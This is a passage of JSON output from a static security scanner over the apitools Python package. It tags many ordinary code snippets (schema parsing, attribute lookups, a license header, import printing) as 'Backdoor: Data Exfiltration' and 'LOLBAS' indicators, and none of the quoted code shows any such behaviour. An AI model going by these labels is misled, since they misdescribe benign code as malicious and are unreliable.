                      "markdown": "`            if not items:\n                raise ValueError('Array type with no item type: %s' % attrs)\n            entry_name_hint = self.__names.ClassName(\n                items.get('title') or '%sListEntry' % name_hint)\n            entry_label = self.__ComputeLabel(items)\n            if entry_label == descriptor.FieldDescriptor.Label.REPEATED:\n                parent_name = self.__names.ClassName(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 431,
                  "startColumn": 25,
                  "endLine": 431,
                  "endColumn": 30,
                  "snippet": {
                    "text": "            return type_info\n\n        if type_name == 'array':\n            items = attrs.get('items')\n            if not items:\n                raise ValueError('Array type with no item type: %s' % attrs)\n            entry_name_hint = self.__names.ClassName(\n",
                    "rendered": {
                      "text": "            return type_info\n\n        if type_name == 'array':\n            items = attrs.get('items')\n            if not items:\n                raise ValueError('Array type with no item type: %s' % attrs)\n            entry_name_hint = self.__names.ClassName(\n",
                      "markdown": "`            return type_info\n\n        if type_name == 'array':\n            items = attrs.get('items')\n            if not items:\n                raise ValueError('Array type with no item type: %s' % attrs)\n            entry_name_hint = self.__names.ClassName(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 404,
                  "startColumn": 49,
                  "endLine": 404,
                  "endColumn": 54,
                  "snippet": {
                    "text": "            return self.__DeclareEnum(enum_name, attrs)\n\n        if 'format' in attrs:\n            type_info = self.PRIMITIVE_FORMAT_MAP.get(attrs['format'])\n            if type_info is None:\n                # If we don't recognize the format, the spec says we fall back\n                # to just using the type name.\n",
                    "rendered": {
                      "text": "            return self.__DeclareEnum(enum_name, attrs)\n\n        if 'format' in attrs:\n            type_info = self.PRIMITIVE_FORMAT_MAP.get(attrs['format'])\n            if type_info is None:\n                # If we don't recognize the format, the spec says we fall back\n                # to just using the type name.\n",
                      "markdown": "`            return self.__DeclareEnum(enum_name, attrs)\n\n        if 'format' in attrs:\n            type_info = self.PRIMITIVE_FORMAT_MAP.get(attrs['format'])\n            if type_info is None:\n                # If we don't recognize the format, the spec says we fall back\n                # to just using the type name.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 387,
                  "startColumn": 25,
                  "endLine": 387,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        \"\"\"Return a TypeInfo object for attrs, creating one if needed.\"\"\"\n\n        type_ref = self.__names.ClassName(attrs.get('$ref'))\n        type_name = attrs.get('type')\n        if not (type_ref or type_name):\n            raise ValueError('No type found for %s' % attrs)\n\n",
                    "rendered": {
                      "text": "        \"\"\"Return a TypeInfo object for attrs, creating one if needed.\"\"\"\n\n        type_ref = self.__names.ClassName(attrs.get('$ref'))\n        type_name = attrs.get('type')\n        if not (type_ref or type_name):\n            raise ValueError('No type found for %s' % attrs)\n\n",
                      "markdown": "`        \"\"\"Return a TypeInfo object for attrs, creating one if needed.\"\"\"\n\n        type_ref = self.__names.ClassName(attrs.get('$ref'))\n        type_name = attrs.get('type')\n        if not (type_ref or type_name):\n            raise ValueError('No type found for %s' % attrs)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 386,
                  "startColumn": 47,
                  "endLine": 386,
                  "endColumn": 52,
                  "snippet": {
                    "text": "    def __GetTypeInfo(self, attrs, name_hint):\n        \"\"\"Return a TypeInfo object for attrs, creating one if needed.\"\"\"\n\n        type_ref = self.__names.ClassName(attrs.get('$ref'))\n        type_name = attrs.get('type')\n        if not (type_ref or type_name):\n            raise ValueError('No type found for %s' % attrs)\n",
                    "rendered": {
                      "text": "    def __GetTypeInfo(self, attrs, name_hint):\n        \"\"\"Return a TypeInfo object for attrs, creating one if needed.\"\"\"\n\n        type_ref = self.__names.ClassName(attrs.get('$ref'))\n        type_name = attrs.get('type')\n        if not (type_ref or type_name):\n            raise ValueError('No type found for %s' % attrs)\n",
                      "markdown": "`    def __GetTypeInfo(self, attrs, name_hint):\n        \"\"\"Return a TypeInfo object for attrs, creating one if needed.\"\"\"\n\n        type_ref = self.__names.ClassName(attrs.get('$ref'))\n        type_name = attrs.get('type')\n        if not (type_ref or type_name):\n            raise ValueError('No type found for %s' % attrs)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 369,
                  "startColumn": 33,
                  "endLine": 369,
                  "endColumn": 38,
                  "snippet": {
                    "text": "    def __DeclareEnum(self, enum_name, attrs):\n        description = util.CleanDescription(attrs.get('description', ''))\n        enum_values = attrs['enum']\n        enum_descriptions = attrs.get(\n            'enumDescriptions', [''] * len(enum_values))\n        self.AddEnumDescriptor(enum_name, description,\n                               enum_values, enum_descriptions)\n",
                    "rendered": {
                      "text": "    def __DeclareEnum(self, enum_name, attrs):\n        description = util.CleanDescription(attrs.get('description', ''))\n        enum_values = attrs['enum']\n        enum_descriptions = attrs.get(\n            'enumDescriptions', [''] * len(enum_values))\n        self.AddEnumDescriptor(enum_name, description,\n                               enum_values, enum_descriptions)\n",
                      "markdown": "`    def __DeclareEnum(self, enum_name, attrs):\n        description = util.CleanDescription(attrs.get('description', ''))\n        enum_values = attrs['enum']\n        enum_descriptions = attrs.get(\n            'enumDescriptions', [''] * len(enum_values))\n        self.AddEnumDescriptor(enum_name, description,\n                               enum_values, enum_descriptions)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 367,
                  "startColumn": 49,
                  "endLine": 367,
                  "endColumn": 54,
                  "snippet": {
                    "text": "        return descriptor.FieldDescriptor.Label.OPTIONAL\n\n    def __DeclareEnum(self, enum_name, attrs):\n        description = util.CleanDescription(attrs.get('description', ''))\n        enum_values = attrs['enum']\n        enum_descriptions = attrs.get(\n            'enumDescriptions', [''] * len(enum_values))\n",
                    "rendered": {
                      "text": "        return descriptor.FieldDescriptor.Label.OPTIONAL\n\n    def __DeclareEnum(self, enum_name, attrs):\n        description = util.CleanDescription(attrs.get('description', ''))\n        enum_values = attrs['enum']\n        enum_descriptions = attrs.get(\n            'enumDescriptions', [''] * len(enum_values))\n",
                      "markdown": "`        return descriptor.FieldDescriptor.Label.OPTIONAL\n\n    def __DeclareEnum(self, enum_name, attrs):\n        description = util.CleanDescription(attrs.get('description', ''))\n        enum_values = attrs['enum']\n        enum_descriptions = attrs.get(\n            'enumDescriptions', [''] * len(enum_values))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 362,
                  "startColumn": 18,
                  "endLine": 362,
                  "endColumn": 23,
                  "snippet": {
                    "text": "            return descriptor.FieldDescriptor.Label.REQUIRED\n        elif attrs.get('type') == 'array':\n            return descriptor.FieldDescriptor.Label.REPEATED\n        elif attrs.get('repeated'):\n            return descriptor.FieldDescriptor.Label.REPEATED\n        return descriptor.FieldDescriptor.Label.OPTIONAL\n\n",
                    "rendered": {
                      "text": "            return descriptor.FieldDescriptor.Label.REQUIRED\n        elif attrs.get('type') == 'array':\n            return descriptor.FieldDescriptor.Label.REPEATED\n        elif attrs.get('repeated'):\n            return descriptor.FieldDescriptor.Label.REPEATED\n        return descriptor.FieldDescriptor.Label.OPTIONAL\n\n",
                      "markdown": "`            return descriptor.FieldDescriptor.Label.REQUIRED\n        elif attrs.get('type') == 'array':\n            return descriptor.FieldDescriptor.Label.REPEATED\n        elif attrs.get('repeated'):\n            return descriptor.FieldDescriptor.Label.REPEATED\n        return descriptor.FieldDescriptor.Label.OPTIONAL\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 360,
                  "startColumn": 18,
                  "endLine": 360,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    def __ComputeLabel(attrs):\n        if attrs.get('required', False):\n            return descriptor.FieldDescriptor.Label.REQUIRED\n        elif attrs.get('type') == 'array':\n            return descriptor.FieldDescriptor.Label.REPEATED\n        elif attrs.get('repeated'):\n            return descriptor.FieldDescriptor.Label.REPEATED\n",
                    "rendered": {
                      "text": "    def __ComputeLabel(attrs):\n        if attrs.get('required', False):\n            return descriptor.FieldDescriptor.Label.REQUIRED\n        elif attrs.get('type') == 'array':\n            return descriptor.FieldDescriptor.Label.REPEATED\n        elif attrs.get('repeated'):\n            return descriptor.FieldDescriptor.Label.REPEATED\n",
                      "markdown": "`    def __ComputeLabel(attrs):\n        if attrs.get('required', False):\n            return descriptor.FieldDescriptor.Label.REQUIRED\n        elif attrs.get('type') == 'array':\n            return descriptor.FieldDescriptor.Label.REPEATED\n        elif attrs.get('repeated'):\n            return descriptor.FieldDescriptor.Label.REPEATED\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 358,
                  "startColumn": 16,
                  "endLine": 358,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\n    @staticmethod\n    def __ComputeLabel(attrs):\n        if attrs.get('required', False):\n            return descriptor.FieldDescriptor.Label.REQUIRED\n        elif attrs.get('type') == 'array':\n            return descriptor.FieldDescriptor.Label.REPEATED\n",
                    "rendered": {
                      "text": "\n    @staticmethod\n    def __ComputeLabel(attrs):\n        if attrs.get('required', False):\n            return descriptor.FieldDescriptor.Label.REQUIRED\n        elif attrs.get('type') == 'array':\n            return descriptor.FieldDescriptor.Label.REPEATED\n",
                      "markdown": "`\n    @staticmethod\n    def __ComputeLabel(attrs):\n        if attrs.get('required', False):\n            return descriptor.FieldDescriptor.Label.REQUIRED\n        elif attrs.get('type') == 'array':\n            return descriptor.FieldDescriptor.Label.REPEATED\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 352,
                  "startColumn": 17,
                  "endLine": 352,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        extended_field = extended_descriptor.ExtendedFieldDescriptor()\n        extended_field.name = field.name\n        extended_field.description = util.CleanDescription(\n            attrs.get('description', 'A %s attribute.' % field.type_name))\n        extended_field.field_descriptor = field\n        return extended_field\n\n",
                    "rendered": {
                      "text": "        extended_field = extended_descriptor.ExtendedFieldDescriptor()\n        extended_field.name = field.name\n        extended_field.description = util.CleanDescription(\n            attrs.get('description', 'A %s attribute.' % field.type_name))\n        extended_field.field_descriptor = field\n        return extended_field\n\n",
                      "markdown": "`        extended_field = extended_descriptor.ExtendedFieldDescriptor()\n        extended_field.name = field.name\n        extended_field.description = util.CleanDescription(\n            attrs.get('description', 'A %s attribute.' % field.type_name))\n        extended_field.field_descriptor = field\n        return extended_field\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 273,
                  "startColumn": 31,
                  "endLine": 273,
                  "endColumn": 36,
                  "snippet": {
                    "text": "            'description', 'A %s object.' % message.name))\n        self.__DeclareDescriptor(message.name)\n        with self.__DescriptorEnv(message):\n            properties = schema.get('properties', {})\n            for index, (name, attrs) in enumerate(sorted(properties.items())):\n                field = self.__FieldDescriptorFromProperties(\n                    name, index + 1, attrs)\n",
                    "rendered": {
                      "text": "            'description', 'A %s object.' % message.name))\n        self.__DeclareDescriptor(message.name)\n        with self.__DescriptorEnv(message):\n            properties = schema.get('properties', {})\n            for index, (name, attrs) in enumerate(sorted(properties.items())):\n                field = self.__FieldDescriptorFromProperties(\n                    name, index + 1, attrs)\n",
                      "markdown": "`            'description', 'A %s object.' % message.name))\n        self.__DeclareDescriptor(message.name)\n        with self.__DescriptorEnv(message):\n            properties = schema.get('properties', {})\n            for index, (name, attrs) in enumerate(sorted(properties.items())):\n                field = self.__FieldDescriptorFromProperties(\n                    name, index + 1, attrs)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 269,
                  "startColumn": 58,
                  "endLine": 269,
                  "endColumn": 63,
                  "snippet": {
                    "text": "                             schema.get('type'))\n        message = extended_descriptor.ExtendedMessageDescriptor()\n        message.name = self.__names.ClassName(schema['id'])\n        message.description = util.CleanDescription(schema.get(\n            'description', 'A %s object.' % message.name))\n        self.__DeclareDescriptor(message.name)\n        with self.__DescriptorEnv(message):\n",
                    "rendered": {
                      "text": "                             schema.get('type'))\n        message = extended_descriptor.ExtendedMessageDescriptor()\n        message.name = self.__names.ClassName(schema['id'])\n        message.description = util.CleanDescription(schema.get(\n            'description', 'A %s object.' % message.name))\n        self.__DeclareDescriptor(message.name)\n        with self.__DescriptorEnv(message):\n",
                      "markdown": "`                             schema.get('type'))\n        message = extended_descriptor.ExtendedMessageDescriptor()\n        message.name = self.__names.ClassName(schema['id'])\n        message.description = util.CleanDescription(schema.get(\n            'description', 'A %s object.' % message.name))\n        self.__DeclareDescriptor(message.name)\n        with self.__DescriptorEnv(message):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 266,
                  "startColumn": 35,
                  "endLine": 266,
                  "endColumn": 40,
                  "snippet": {
                    "text": "            return\n        if schema.get('type') != 'object':\n            raise ValueError('Cannot create message descriptors for type %s' %\n                             schema.get('type'))\n        message = extended_descriptor.ExtendedMessageDescriptor()\n        message.name = self.__names.ClassName(schema['id'])\n        message.description = util.CleanDescription(schema.get(\n",
                    "rendered": {
                      "text": "            return\n        if schema.get('type') != 'object':\n            raise ValueError('Cannot create message descriptors for type %s' %\n                             schema.get('type'))\n        message = extended_descriptor.ExtendedMessageDescriptor()\n        message.name = self.__names.ClassName(schema['id'])\n        message.description = util.CleanDescription(schema.get(\n",
                      "markdown": "`            return\n        if schema.get('type') != 'object':\n            raise ValueError('Cannot create message descriptors for type %s' %\n                             schema.get('type'))\n        message = extended_descriptor.ExtendedMessageDescriptor()\n        message.name = self.__names.ClassName(schema['id'])\n        message.description = util.CleanDescription(schema.get(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 264,
                  "startColumn": 17,
                  "endLine": 264,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        if schema.get('type') == 'any':\n            self.__DeclareMessageAlias(schema, 'extra_types.JsonValue')\n            return\n        if schema.get('type') != 'object':\n            raise ValueError('Cannot create message descriptors for type %s' %\n                             schema.get('type'))\n        message = extended_descriptor.ExtendedMessageDescriptor()\n",
                    "rendered": {
                      "text": "        if schema.get('type') == 'any':\n            self.__DeclareMessageAlias(schema, 'extra_types.JsonValue')\n            return\n        if schema.get('type') != 'object':\n            raise ValueError('Cannot create message descriptors for type %s' %\n                             schema.get('type'))\n        message = extended_descriptor.ExtendedMessageDescriptor()\n",
                      "markdown": "`        if schema.get('type') == 'any':\n            self.__DeclareMessageAlias(schema, 'extra_types.JsonValue')\n            return\n        if schema.get('type') != 'object':\n            raise ValueError('Cannot create message descriptors for type %s' %\n                             schema.get('type'))\n        message = extended_descriptor.ExtendedMessageDescriptor()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 261,
                  "startColumn": 17,
                  "endLine": 261,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        if schema.get('enum'):\n            self.__DeclareEnum(schema_name, schema)\n            return\n        if schema.get('type') == 'any':\n            self.__DeclareMessageAlias(schema, 'extra_types.JsonValue')\n            return\n        if schema.get('type') != 'object':\n",
                    "rendered": {
                      "text": "        if schema.get('enum'):\n            self.__DeclareEnum(schema_name, schema)\n            return\n        if schema.get('type') == 'any':\n            self.__DeclareMessageAlias(schema, 'extra_types.JsonValue')\n            return\n        if schema.get('type') != 'object':\n",
                      "markdown": "`        if schema.get('enum'):\n            self.__DeclareEnum(schema_name, schema)\n            return\n        if schema.get('type') == 'any':\n            self.__DeclareMessageAlias(schema, 'extra_types.JsonValue')\n            return\n        if schema.get('type') != 'object':\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 258,
                  "startColumn": 17,
                  "endLine": 258,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        # TODO(craigcitro): Is schema_name redundant?\n        if self.__GetDescriptor(schema_name):\n            return\n        if schema.get('enum'):\n            self.__DeclareEnum(schema_name, schema)\n            return\n        if schema.get('type') == 'any':\n",
                    "rendered": {
                      "text": "        # TODO(craigcitro): Is schema_name redundant?\n        if self.__GetDescriptor(schema_name):\n            return\n        if schema.get('enum'):\n            self.__DeclareEnum(schema_name, schema)\n            return\n        if schema.get('type') == 'any':\n",
                      "markdown": "`        # TODO(craigcitro): Is schema_name redundant?\n        if self.__GetDescriptor(schema_name):\n            return\n        if schema.get('enum'):\n            self.__DeclareEnum(schema_name, schema)\n            return\n        if schema.get('type') == 'any':\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/message_registry.py"
                },
                "region": {
                  "startLine": 236,
                  "startColumn": 38,
                  "endLine": 236,
                  "endColumn": 43,
                  "snippet": {
                    "text": "        entries_type_name = self.__AddAdditionalPropertyType(\n            message.name, additional_properties_info)\n        description = util.CleanDescription(\n            additional_properties_info.get('description'))\n        if description is None:\n            description = 'Additional properties of type %s' % message.name\n        attrs = {\n",
                    "rendered": {
                      "text": "        entries_type_name = self.__AddAdditionalPropertyType(\n            message.name, additional_properties_info)\n        description = util.CleanDescription(\n            additional_properties_info.get('description'))\n        if description is None:\n            description = 'Additional properties of type %s' % message.name\n        attrs = {\n",
                      "markdown": "`        entries_type_name = self.__AddAdditionalPropertyType(\n            message.name, additional_properties_info)\n        description = util.CleanDescription(\n            additional_properties_info.get('description'))\n        if description is None:\n            description = 'Additional properties of type %s' % message.name\n        attrs = {\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/extended_descriptor.py"
                },
                "region": {
                  "startLine": 403,
                  "startColumn": 45,
                  "endLine": 403,
                  "endColumn": 49,
                  "snippet": {
                    "text": "                self.__printer(import_)\n            self.__printer()\n        # Note: If we ever were going to add imports from this package, we'd\n        # need to sort those out and put them at the end.\n        if google_imports:\n            for import_ in sorted(google_imports):\n                self.__printer(import_)\n",
                    "rendered": {
                      "text": "                self.__printer(import_)\n            self.__printer()\n        # Note: If we ever were going to add imports from this package, we'd\n        # need to sort those out and put them at the end.\n        if google_imports:\n            for import_ in sorted(google_imports):\n                self.__printer(import_)\n",
                      "markdown": "`                self.__printer(import_)\n            self.__printer()\n        # Note: If we ever were going to add imports from this package, we'd\n        # need to sort those out and put them at the end.\n        if google_imports:\n            for import_ in sorted(google_imports):\n                self.__printer(import_)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/extended_descriptor.py"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 34,
                  "endLine": 28,
                  "endColumn": 38,
                  "snippet": {
                    "text": "message, since we need to change the type of the subfields. We could\nhave a \"plain\" descriptor attached, but that seems like unnecessary\nbookkeeping. Where possible, we purposely reuse existing tag numbers;\nfor new fields, we start numbering at 100.\n\"\"\"\nimport abc\nimport operator\n",
                    "rendered": {
                      "text": "message, since we need to change the type of the subfields. We could\nhave a \"plain\" descriptor attached, but that seems like unnecessary\nbookkeeping. Where possible, we purposely reuse existing tag numbers;\nfor new fields, we start numbering at 100.\n\"\"\"\nimport abc\nimport operator\n",
                      "markdown": "`message, since we need to change the type of the subfields. We could\nhave a \"plain\" descriptor attached, but that seems like unnecessary\nbookkeeping. Where possible, we purposely reuse existing tag numbers;\nfor new fields, we start numbering at 100.\n\"\"\"\nimport abc\nimport operator\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/extended_descriptor.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/extended_descriptor.py"
                },
                "region": {
                  "startLine": 403,
                  "startColumn": 17,
                  "endLine": 403,
                  "endColumn": 23,
                  "snippet": {
                    "text": "                self.__printer(import_)\n            self.__printer()\n        # Note: If we ever were going to add imports from this package, we'd\n        # need to sort those out and put them at the end.\n        if google_imports:\n            for import_ in sorted(google_imports):\n                self.__printer(import_)\n",
                    "rendered": {
                      "text": "                self.__printer(import_)\n            self.__printer()\n        # Note: If we ever were going to add imports from this package, we'd\n        # need to sort those out and put them at the end.\n        if google_imports:\n            for import_ in sorted(google_imports):\n                self.__printer(import_)\n",
                      "markdown": "`                self.__printer(import_)\n            self.__printer()\n        # Note: If we ever were going to add imports from this package, we'd\n        # need to sort those out and put them at the end.\n        if google_imports:\n            for import_ in sorted(google_imports):\n                self.__printer(import_)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/extended_descriptor.py"
                },
                "region": {
                  "startLine": 113,
                  "startColumn": 41,
                  "endLine": 113,
                  "endColumn": 46,
                  "snippet": {
